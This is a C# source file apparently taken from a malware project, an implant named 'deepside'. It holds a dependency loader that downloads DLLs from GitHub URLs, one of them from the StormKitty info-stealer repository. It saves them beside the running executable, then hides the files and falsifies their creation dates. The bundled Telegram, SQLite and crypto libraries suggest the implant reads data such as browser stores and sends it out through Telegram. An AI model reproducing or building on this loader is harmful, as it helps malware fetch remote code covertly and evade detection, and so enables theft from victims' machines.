using System;
using System.IO;
using System.Net;
using deepside.Implant;

namespace deepside
{
    internal sealed class Libs
    {

        //public static string AnonFile = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/AnonFileApi.1.14.6/lib/net40/AnonFileApi.dll";
        public static string ZipLib = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll";
        public static string BouncyCastle = "https://github.com/pa1nz0r1337/libsxd/blob/main/BouncyCastle.Crypto.dll?raw=true";
        public static string indexrange = "https://github.com/pa1nz0r1337/libsxd/blob/main/IndexRange.dll?raw=true";
        public static string newtonsoft = "https://github.com/pa1nz0r1337/libsxd/blob/main/Newtonsoft.Json.dll?raw=true";
        public static string sqliteinterpop = "https://github.com/pa1nz0r1337/libsxd/blob/main/SQLite.Interop.dll?raw=true";
        public static string sqlitedata = "https://github.com/pa1nz0r1337/libsxd/blob/main/System.Data.SQLite.dll?raw=true";
        public static string textencoding = "https://github.com/pa1nz0r1337/libsxd/blob/main/System.Text.Encodings.Web.dll?raw=true";
        public static string jsonxd = "https://github.com/pa1nz0r1337/libsxd/blob/main/System.Text.Json.dll?raw=true";
        public static string systemthreading = "https://github.com/pa1nz0r1337/libsxd/blob/main/System.Threading.Tasks.Extensions.dll?raw=true";
       // public static string tgbotxd = "https://github.com/pa1nz0r1337/libsxd/blob/main/Telegram.Bot.dll?raw=true";
        public static string wtelegramclient = "https://github.com/pa1nz0r1337/libsxd/blob/main/WTelegramClient.dll?raw=true";
        public static string telebotdll = "https://github.com/pa1nz0r1337/RUST-auto-update-offsets/blob/main/Telegram.Bot.dll?raw=true";
        public static string telebotpdb = "https://github.com/pa1nz0r1337/RUST-auto-update-offsets/blob/main/Telegram.Bot.pdb?raw=true";
        public static string telebotxml = "https://raw.githubusercontent.com/pa1nz0r1337/RUST-auto-update-offsets/main/Telegram.Bot.xml";
        public static bool LoadRemoteLibrary(string library)
        {
            int i = 0;
            string dll = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(library).LocalPath));
            
            while (i < 3)
            {
                i++;
                if (!File.Exists(dll))
                {
                    try
                    {
                        using (var client = new WebClient())
                            client.DownloadFile(library, dll);
                    }
                    catch (WebException)
                    {
                        //Logging.Log("LibLoader: Failed to download library " + dll);
                        System.Threading.Thread.Sleep(2000);
                        continue;
                    }

                    Startup.HideFile(dll);
                    Startup.SetFileCreationDate(dll);
                }
            }
            return File.Exists(dll);
        }
        public static bool loadremote(string luba)
        {
            int i = 0;
            string dll = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(luba).LocalPath));

            while (i < 3)
            {
                i++;
                if (!File.Exists(dll))
                {
                    try
                    {
                        using (var client = new WebClient())
                            client.DownloadFile(luba, dll);
                    }
                    catch (WebException)
                    {
                        //Logging.Log("LibLoader: Failed to download library " + dll);
                        System.Threading.Thread.Sleep(2000);
                        continue;
                    }
                    Startup.SetFileCreationDate(dll);
                }
            }
            return File.Exists(dll);
        }
    }
}
